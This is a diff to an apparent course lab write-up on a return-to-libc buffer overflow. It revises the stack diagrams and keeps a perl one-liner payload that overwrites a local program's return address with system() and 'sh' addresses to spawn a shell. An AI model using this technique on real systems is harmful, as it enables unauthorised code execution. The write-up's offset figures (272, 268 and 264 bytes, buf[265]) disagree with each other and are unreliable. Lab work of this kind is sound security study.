@@ -58,18 +58,19 @@ Since we have a non-executable stack, we will still overwrite the return address
 
 | Before overflow |
 |-----------------|
-| arg2            (higher addresses)|	
-| arg1            |
-| return address  |
-| ebp             |
-| buf[]           (lower addresses\)|
+| arguments       (higher addresses)|
+| saved return address (eip) 4 bytes  |
+| saved frame pointer (ebp) 4 bytes            |
+| ... (buffer grows up in this direction)
+| buf[265]       (lower addresses\)|
 
 | After overflow       |
 |----------------------|
 | 'sh' address         |
-| HACK          |
-| ebp: system() address |
-| buf[]: 268 'A's                |
+| dummy return addr : HACK          |
+| eip: system() address |
+| ebp :AAAA (overwritten frame pointer)
+| buf[]: 264 'A's                |
 
 Already know we need 272 bytes to overwrite the return address so lets fire up gdb to find out the address of the libc `system()` call and an address for string 'sh': `gdb vulnerable`
 
@@ -239,7 +240,7 @@ And now lets run our exploit
 comp-name # ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7\xc4\xbb\xec\xb7\xf5\x40\xf7\xb7"'`
 ```
 
-And verify we've spawned our shell:
+And verify we've spawned our shell and managed to exited cleanly:
 
 ```
 amilkov3@amilkov3-VirtualBox:~/Dropbox/CS6035/Project1/Extraneous$ ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7\xc4\xbb\xec\xb7\xf5\x40\xf7\xb7"'`
